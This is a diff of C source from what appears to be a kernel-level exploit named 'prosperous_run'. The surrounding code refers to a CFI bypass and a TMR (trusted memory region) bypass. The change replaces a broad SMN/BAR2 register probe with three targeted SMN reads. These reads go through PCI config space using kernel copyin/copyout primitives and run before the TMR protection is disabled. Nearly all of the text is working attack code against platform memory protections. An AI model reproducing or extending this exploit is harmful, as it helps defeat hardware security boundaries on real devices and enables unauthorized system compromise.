@@ -173,70 +173,6 @@ static int cfi_bypass(struct phys_rw_ctx *ctx)
 /*
  * Main exploit entry point.
  */
-/* Separated into own function to avoid stack bloat in prosperous_run */
-static void phase1_5_smn_bar2_probe(struct phys_rw_ctx *ctx)
-{
-    uint64_t dmap = ctx->dmap_base;
-
-    /* === SMN probe via B0:D0:F0+0x60/0x64 ===
-     * Same mechanism TMR code uses every run. */
-    printf("\n[*] Part B: SMN probe (B0:D0:F0+0x60/0x64)...\n");
-    {
-        uint64_t smn_idx = dmap + PCI_B0D0F0 + 0x60;
-        uint64_t smn_dat = dmap + PCI_B0D0F0 + 0x64;
-
-        /* Verify mechanism works: read known TMR reg */
-        uint32_t test_addr = 0x00052080;
-        kernel_copyin(&test_addr, smn_idx, 4);
-        uint32_t test_val;
-        kernel_copyout(smn_dat, &test_val, 4);
-        printf("[SMN] 0x%08x = 0x%08x (TMR20 base, expect 0x00006000)\n",
-               test_addr, test_val);
-
-        /* Probe MP4-related ranges */
-        uint32_t smn_addrs[] = {
-            0x00015000, 0x00015004, 0x00015008, 0x0001500C,
-            0x00016000, 0x00016004, 0x00016008, 0x0001600C,
-            0x0003E000, 0x0003E004, 0x0003E008, 0x0003E00C,
-            0x0003F000, 0x0003F004, 0x0003F008, 0x0003F00C,
-            0x15800000, 0x15800004, 0x15800008, 0x1580000C,
-            0x15C00000, 0x15C00004, 0x15C00008, 0x15C0000C,
-            0x15C10000, 0x15C10004, 0x15C10008, 0x15C1000C,
-            0x15C20000, 0x15C20004, 0x15C20008, 0x15C2000C,
-        };
-
-        for (int i = 0; i < 32; i++) {
-            uint32_t addr = smn_addrs[i];
-            kernel_copyin(&addr, smn_idx, 4);
-            uint32_t val;
-            kernel_copyout(smn_dat, &val, 4);
-
-            if (i % 4 == 0)
-                printf("[SMN] 0x%08x:", addr);
-            printf(" %08x", val);
-            if (i % 4 == 3)
-                printf("\n");
-        }
-    }
-
-    /* === BAR2+0x200000 first 16 registers ===
-     * Known-good offset, 16 reads only. */
-    printf("\n[*] Part C: BAR2+0x200000 registers (64 bytes)...\n");
-    {
-        uint64_t bar2 = dmap + MP4_BAR2_PA;
-        for (int i = 0; i < 4; i++) {
-            uint32_t vals[4];
-            for (int j = 0; j < 4; j++) {
-                kernel_copyout(bar2 + 0x200000 + (i*4+j)*4,
-                               &vals[j], 4);
-            }
-            printf("[BAR2] +0x%06x: %08x %08x %08x %08x\n",
-                   0x200000 + i * 16, vals[0], vals[1],
-                   vals[2], vals[3]);
-        }
-    }
-}
-
 int prosperous_run(void)
 {
     struct phys_rw_ctx ctx;
@@ -266,12 +202,31 @@ int prosperous_run(void)
         return ret;
     }
 
-    /* Phase 0.5: SMN + BAR2 probe BEFORE TMR disable.
-     * These use PCI config/MMIO (not DRAM via DMAP), so TMR state
-     * doesn't matter. Running before TMR disable avoids the
-     * timing-dependent crash that occurs after TMR 20 removal
-     * (MP4 coprocessor instability after ~100-200ms). */
-    phase1_5_smn_bar2_probe(&ctx);
+    /* Phase 0.5: Quick SMN probe — just 3 reads via B0:D0:F0+0x60/0x64.
+     * Same mechanism TMR code uses. No arrays, minimal code. */
+    printf("\n[*] Phase 0.5: SMN probe...\n");
+    {
+        uint64_t smn_idx = ctx.dmap_base + PCI_B0D0F0 + 0x60;
+        uint64_t smn_dat = ctx.dmap_base + PCI_B0D0F0 + 0x64;
+        uint32_t addr, val;
+
+        /* Verify: read known TMR20 base register */
+        addr = 0x00052080;
+        kernel_copyin(&addr, smn_idx, 4);
+        kernel_copyout(smn_dat, &val, 4);
+        printf("[SMN] 0x%08x = 0x%08x (TMR20, expect ~0x6000)\n", addr, val);
+
+        /* Probe SysHub TLB control area */
+        addr = 0x0003E000;
+        kernel_copyin(&addr, smn_idx, 4);
+        kernel_copyout(smn_dat, &val, 4);
+        printf("[SMN] 0x%08x = 0x%08x\n", addr, val);
+
+        addr = 0x0003F000;
+        kernel_copyin(&addr, smn_idx, 4);
+        kernel_copyout(smn_dat, &val, 4);
+        printf("[SMN] 0x%08x = 0x%08x\n", addr, val);
+    }
 
     /* Phase 1: TMR bypass */
     printf("\n[*] Phase 1: TMR bypass...\n");
